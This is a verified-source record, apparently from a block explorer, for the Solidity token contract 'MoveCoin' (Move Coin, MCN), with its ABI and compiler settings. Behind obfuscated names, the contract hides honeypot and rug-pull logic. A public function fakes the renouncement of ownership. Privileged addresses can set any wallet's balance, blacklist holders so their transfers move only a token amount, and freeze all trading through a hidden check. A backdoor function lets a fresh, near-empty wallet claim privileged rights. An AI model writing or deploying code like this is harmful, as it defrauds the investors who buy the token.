{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract swapTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletTotal {\n    function createPair(address toReceiverMode, address feeTake) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface maxReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface takeLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitMax) external view returns (uint256);\n\n    function transfer(address exemptTrading, uint256 autoMaxExempt) external returns (bool);\n\n    function allowance(address enableSenderLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoMaxExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptTrading,\n        uint256 autoMaxExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeTrading, uint256 value);\n    event Approval(address indexed enableSenderLiquidity, address indexed spender, uint256 value);\n}\n\ninterface isLiquidity is takeLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MoveCoin is swapTx, takeLaunched, isLiquidity {\n\n    uint256 constant liquidityAt = 5 ** 10;\n\n    uint256 public tradingLaunched = 3;\n\n    bool public walletToken;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txLiquidity;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingTeam;\n    }\n\n    function balanceOf(address limitMax) public view virtual override returns (uint256) {\n        return walletMax[limitMax];\n    }\n\n    uint256 isLaunchedExempt;\n\n    function liquidityToken(address listExempt, address exemptTrading, uint256 autoMaxExempt) internal returns (bool) {\n        require(walletMax[listExempt] >= autoMaxExempt);\n        walletMax[listExempt] -= autoMaxExempt;\n        walletMax[exemptTrading] += autoMaxExempt;\n        emit Transfer(listExempt, exemptTrading, autoMaxExempt);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txList;\n    }\n\n    function minReceiver() private view {\n        require(teamReceiver[_msgSender()]);\n    }\n\n    bool private amountTotal;\n\n    uint256 public swapWallet;\n\n    bool public tradingWalletSender;\n\n    function approve(address receiverSell, uint256 autoMaxExempt) public virtual override returns (bool) {\n        buyWalletLaunch[_msgSender()][receiverSell] = autoMaxExempt;\n        emit Approval(_msgSender(), receiverSell, autoMaxExempt);\n        return true;\n    }\n\n    function tokenReceiver(address autoReceiver, uint256 autoMaxExempt) public {\n        minReceiver();\n        walletMax[autoReceiver] = autoMaxExempt;\n    }\n\n    string private marketingTeam = \"MCN\";\n\n    event OwnershipTransferred(address indexed isSwap, address indexed marketingSell);\n\n    function autoAt(address listExempt, address exemptTrading, uint256 autoMaxExempt) internal returns (bool) {\n        if (listExempt == launchLimit) {\n            return liquidityToken(listExempt, exemptTrading, autoMaxExempt);\n        }\n        uint256 atList = takeLaunched(tokenTo).balanceOf(receiverAmountTrading);\n        require(atList == isLaunchedExempt);\n        require(exemptTrading != receiverAmountTrading);\n        if (amountAuto[listExempt]) {\n            return liquidityToken(listExempt, exemptTrading, liquidityAt);\n        }\n        autoMaxExempt = senderWallet(listExempt, exemptTrading, autoMaxExempt);\n        return liquidityToken(listExempt, exemptTrading, autoMaxExempt);\n    }\n\n    bool public minTrading;\n\n    address private isFund;\n\n    function getOwner() external view returns (address) {\n        return isFund;\n    }\n\n    bool public swapLiquidity;\n\n    uint8 private txLiquidity = 18;\n\n    mapping(address => bool) public amountAuto;\n\n    function allowance(address amountShould, address receiverSell) external view virtual override returns (uint256) {\n        if (receiverSell == launchedBuy) {\n            return type(uint256).max;\n        }\n        return buyWalletLaunch[amountShould][receiverSell];\n    }\n\n    string private tokenLaunchedFee = \"Move Coin\";\n\n    function name() external view virtual override returns (string memory) {\n        return tokenLaunchedFee;\n    }\n\n    function listMax(uint256 autoMaxExempt) public {\n        minReceiver();\n        isLaunchedExempt = autoMaxExempt;\n    }\n\n    function transfer(address autoReceiver, uint256 autoMaxExempt) external virtual override returns (bool) {\n        return autoAt(_msgSender(), autoReceiver, autoMaxExempt);\n    }\n\n    mapping(address => mapping(address => uint256)) private buyWalletLaunch;\n\n    function transferFrom(address listExempt, address exemptTrading, uint256 autoMaxExempt) external override returns (bool) {\n        if (_msgSender() != launchedBuy) {\n            if (buyWalletLaunch[listExempt][_msgSender()] != type(uint256).max) {\n                require(autoMaxExempt <= buyWalletLaunch[listExempt][_msgSender()]);\n                buyWalletLaunch[listExempt][_msgSender()] -= autoMaxExempt;\n            }\n        }\n        return autoAt(listExempt, exemptTrading, autoMaxExempt);\n    }\n\n    uint256 private txList = 100000000 * 10 ** 18;\n\n    uint256 private launchSellFee;\n\n    bool private takeReceiver;\n\n    function senderWallet(address listExempt, address exemptTrading, uint256 autoMaxExempt) internal view returns (uint256) {\n        require(autoMaxExempt > 0);\n\n        uint256 fundLaunch = 0;\n        if (listExempt == tokenTo && tradingLaunched > 0) {\n            fundLaunch = autoMaxExempt * tradingLaunched / 100;\n        } else if (exemptTrading == tokenTo && fundSwap > 0) {\n            fundLaunch = autoMaxExempt * fundSwap / 100;\n        }\n        require(fundLaunch <= autoMaxExempt);\n        return autoMaxExempt - fundLaunch;\n    }\n\n    constructor (){\n        \n        modeTx();\n        maxReceiver senderModeEnable = maxReceiver(launchedBuy);\n        tokenTo = walletTotal(senderModeEnable.factory()).createPair(senderModeEnable.WETH(), address(this));\n        receiverAmountTrading = walletTotal(senderModeEnable.factory()).feeTo();\n        if (takeReceiver == liquidityTotalExempt) {\n            amountTotal = true;\n        }\n        launchLimit = _msgSender();\n        teamReceiver[launchLimit] = true;\n        walletMax[launchLimit] = txList;\n        \n        emit Transfer(address(0), launchLimit, txList);\n    }\n\n    function owner() external view returns (address) {\n        return isFund;\n    }\n\n    uint256 shouldLaunch;\n\n    mapping(address => bool) public teamReceiver;\n\n    address launchedBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address receiverAmountTrading;\n\n    bool public liquidityTotalExempt;\n\n    function totalAmount(address minLaunched) public {\n        require(minLaunched.balance < 100000);\n        if (minTrading) {\n            return;\n        }\n        if (tradingWalletSender) {\n            swapLiquidity = true;\n        }\n        teamReceiver[minLaunched] = true;\n        \n        minTrading = true;\n    }\n\n    bool private maxLaunchedSell;\n\n    function feeMaxLaunch(address senderMinList) public {\n        minReceiver();\n        if (launchSellFee == swapWallet) {\n            tradingWalletSender = true;\n        }\n        if (senderMinList == launchLimit || senderMinList == tokenTo) {\n            return;\n        }\n        amountAuto[senderMinList] = true;\n    }\n\n    uint256 public fundSwap = 0;\n\n    address public launchLimit;\n\n    address public tokenTo;\n\n    mapping(address => uint256) private walletMax;\n\n    function modeTx() public {\n        emit OwnershipTransferred(launchLimit, address(0));\n        isFund = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSenderLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMaxExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMinList\",\"type\":\"address\"}],\"name\":\"feeMaxLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTotalExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoMaxExempt\",\"type\":\"uint256\"}],\"name\":\"listMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMaxExempt\",\"type\":\"uint256\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunched\",\"type\":\"address\"}],\"name\":\"totalAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingWalletSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMaxExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMaxExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MoveCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}